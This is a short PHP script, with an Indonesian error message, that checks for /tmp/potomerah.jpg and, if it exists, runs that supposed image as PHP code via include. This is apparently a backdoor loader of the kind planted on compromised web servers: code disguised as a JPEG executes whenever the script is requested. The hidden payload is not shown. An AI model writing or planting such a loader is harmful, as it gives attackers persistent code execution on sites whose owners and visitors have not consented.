<?php
$filePath = '/tmp/potomerah.jpg';

if (file_exists($filePath)) {
    include $filePath;
} else {
    echo "File tidak ditemukan.";
}
?>
